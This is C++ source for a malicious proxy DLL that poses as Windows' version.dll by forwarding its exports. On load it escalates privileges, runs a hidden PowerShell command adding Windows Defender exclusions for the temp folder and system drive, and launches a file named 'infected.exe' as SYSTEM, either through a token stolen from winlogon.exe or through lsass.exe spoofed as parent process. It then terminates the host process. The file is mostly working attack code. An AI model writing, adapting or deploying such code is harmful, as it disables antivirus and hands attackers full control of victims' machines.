#include "pch.h"
#include "prxdll.h"
#include <stdlib.h>
#include <Windows.h>
#include <winver.h>
#include <TlHelp32.h>
#include <shlobj_core.h>
#include <psapi.h>
#include <VersionHelpers.h>

#pragma comment(linker, "/export:GetFileVersionInfoA")
#pragma comment(linker, "/export:GetFileVersionInfoByHandle")
#pragma comment(linker, "/export:GetFileVersionInfoExW")
#pragma comment(linker, "/export:GetFileVersionInfoSizeA")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExW")
#pragma comment(linker, "/export:GetFileVersionInfoSizeW")
#pragma comment(linker, "/export:GetFileVersionInfoW")
#pragma comment(linker, "/export:VerFindFileA")
#pragma comment(linker, "/export:VerFindFileW")
#pragma comment(linker, "/export:VerInstallFileA")
#pragma comment(linker, "/export:VerInstallFileW")
#pragma comment(linker, "/export:VerLanguageNameA=KERNEL32.VerLanguageNameA")
#pragma comment(linker, "/export:VerLanguageNameW=KERNEL32.VerLanguageNameW")
#pragma comment(linker, "/export:VerQueryValueA=version.VerQueryValueA")
#pragma comment(linker, "/export:VerQueryValueW")

BOOL EnableDebugPrivilege()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tokenPrivileges;
	LUID luid;

	// Open the current process token
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		return FALSE;
	}

	// Lookup the LUID for the SeDebugPrivilege
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
	{
		CloseHandle(hToken);
		return FALSE;
	}

	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luid;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Enable the SeDebugPrivilege
	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
	{
		CloseHandle(hToken);
		return FALSE;
	}

	// Check if the privilege was successfully enabled
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);
	return TRUE;
}

BOOL IsAdministrator()
{
	HANDLE hToken;
	BOOL bIsAdmin = FALSE;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		TOKEN_ELEVATION elevation;
		DWORD dwSize;
		if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
		{
			bIsAdmin = elevation.TokenIsElevated;
		}
	}
	CloseHandle(hToken);
	return bIsAdmin;
}

BOOL jumptoSysToken(LPTSTR procTostart) {
	BOOL success = FALSE;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hSnapshot, &processEntry)) {
		do {
			char currentProcessName[MAX_PATH];
			WideCharToMultiByte(CP_ACP, 0, processEntry.szExeFile, -1, currentProcessName, MAX_PATH, NULL, NULL);
			if (strcmp(currentProcessName, "winlogon.exe") == 0) {
				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processEntry.th32ProcessID); // Modified to FALSE
				HANDLE tokenHandle;
				if (OpenProcessToken(hProcess, TOKEN_DUPLICATE, &tokenHandle)) { // Modified TOKEN_CREATE_THREAD to TOKEN_DUPLICATE
					STARTUPINFOW SINFO;
					PROCESS_INFORMATION PINFO;

					ZeroMemory(&SINFO, sizeof(STARTUPINFOW));
					SINFO.cb = sizeof(STARTUPINFOW);
					SINFO.dwFlags = STARTF_USESHOWWINDOW;
					SINFO.wShowWindow = SW_HIDE;

					SECURITY_ATTRIBUTES SECA;
					ZeroMemory(&SECA, sizeof(SECURITY_ATTRIBUTES));
					SECA.nLength = sizeof(SECURITY_ATTRIBUTES);

					HANDLE doubleDuplicateToken;
					if (DuplicateTokenEx(tokenHandle, 0x2000000, &SECA, SecurityImpersonation, TokenPrimary, &doubleDuplicateToken)) {
						if (CreateProcessWithTokenW(doubleDuplicateToken, LOGON_NETCREDENTIALS_ONLY, NULL, procTostart, CREATE_NO_WINDOW, NULL, NULL, &SINFO, &PINFO)) {
							success = TRUE;
						}
						CloseHandle(doubleDuplicateToken);
					}
					CloseHandle(tokenHandle);
				}
				CloseHandle(hProcess);
				break;
			}
		} while (Process32Next(hSnapshot, &processEntry));
	}
	CloseHandle(hSnapshot);
	return success;
}

BOOL jumptoSysHandle(LPTSTR procTostart) {
	BOOL success = FALSE;
	DWORD* processIds = NULL;
	DWORD processIdsSize = 0;
	DWORD bytesReturned = 0;
	while (1) {
		processIdsSize = sizeof(DWORD) * 0xFFFF;
		processIds = (DWORD*)malloc(processIdsSize);
		if (processIds == NULL) {
			return 0;
		}
		if (EnumProcesses(processIds, processIdsSize, &bytesReturned)) {
			if (bytesReturned < processIdsSize)
				break;
		}
	}
	DWORD numProcesses = bytesReturned / sizeof(DWORD);
	DWORD ProcessId = 123;
	for (DWORD i = 0; i < numProcesses; i++) {
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processIds[i]);
		if (hProcess) {
			WCHAR processName[MAX_PATH];
			if (GetProcessImageFileName(hProcess, processName, MAX_PATH)) {
				const wchar_t* processBaseName = wcsrchr(processName, L'\\');
				if (processBaseName)
					processBaseName++;

				if (processBaseName != 0 && wcscmp(processBaseName, L"lsass.exe") == 0) {
					ProcessId = processIds[i];
					break;
				}
			}
			CloseHandle(hProcess);
		}
	}
	free(processIds);
	HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);
	if (handle != NULL) {
		SIZE_T Size = 0;
		InitializeProcThreadAttributeList(NULL, 1, 0, &Size);
		if (Size != 0) {
			SIZE_T dwSize = sizeof(BYTE) * Size;
			PPROC_THREAD_ATTRIBUTE_LIST AttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)malloc(dwSize);
			if (AttributeList != NULL && InitializeProcThreadAttributeList(AttributeList, 1, 0, &Size)) {
				PVOID lpvalue = handle;
				if (UpdateProcThreadAttribute(AttributeList, 0, 0x00020000, &lpvalue, sizeof(lpvalue), NULL, NULL)) {
					STARTUPINFOEX lpStartupInfo;
					ZeroMemory(&lpStartupInfo, sizeof(lpStartupInfo));
					lpStartupInfo.StartupInfo.cb = sizeof(lpStartupInfo);
					lpStartupInfo.lpAttributeList = AttributeList;
					PROCESS_INFORMATION lpProcessInformation;
					ZeroMemory(&lpProcessInformation, sizeof(lpProcessInformation));

					//if (CreateProcess(NULL, procTostart, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_DEFAULT_ERROR_MODE | CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFO)&lpStartupInfo, &lpProcessInformation)) {
					if (CreateProcess(NULL, procTostart, NULL, NULL, FALSE, CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFO)&lpStartupInfo, &lpProcessInformation)) {
						success = TRUE;
						CloseHandle(lpProcessInformation.hProcess);
						CloseHandle(lpProcessInformation.hThread);
					}
				}
			}
			DeleteProcThreadAttributeList(AttributeList);
			free(AttributeList);
		}
		CloseHandle(handle);
	}
	
	return success;
}

void addExclusionPath() {
	wchar_t systemPath[MAX_PATH];
	if (SHGetSpecialFolderPath(NULL, systemPath, CSIDL_WINDOWS, FALSE)) {
		wchar_t drive[4];
		wmemcpy(drive, systemPath, 3);
		drive[3] = L'\0';
		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(STARTUPINFO));
		ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
		si.cb = sizeof(STARTUPINFO);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;
		wchar_t exclusionPath1[] = L"$env:TEMP";
		wchar_t command[1024];
		swprintf(command, 1024, L"powershell.exe -NoLogo -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy bypass -Command \"Add-MpPreference -ExclusionPath %s, '%s'\"", exclusionPath1, drive);
		CreateProcess(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
}

BOOL APIENTRY DllMain(const HINSTANCE instance, const DWORD reason, const PVOID reserved)
{
	wchar_t directoryPath[MAX_PATH];

	switch (reason) {
	case DLL_PROCESS_ATTACH:
		if (IsAdministrator() && EnableDebugPrivilege()) {
			SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, directoryPath);
			addExclusionPath();
			wchar_t command[MAX_PATH + MAX_PATH];
			swprintf_s(command, MAX_PATH + MAX_PATH, L"%s%s", directoryPath, L"\\infected.exe");

			if (!jumptoSysToken(command)) {
				jumptoSysHandle(command);
			}

			free(command);

			DWORD processId = GetCurrentProcessId();
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processId);
			if (hProcess != NULL) {
				TerminateProcess(hProcess, 0);
				CloseHandle(hProcess);
			}
		}

		DisableThreadLibraryCalls(instance);
		return prx_attach(instance);
	case DLL_PROCESS_DETACH:
		prx_detach(reserved);
		break;
	}
	return TRUE;
}
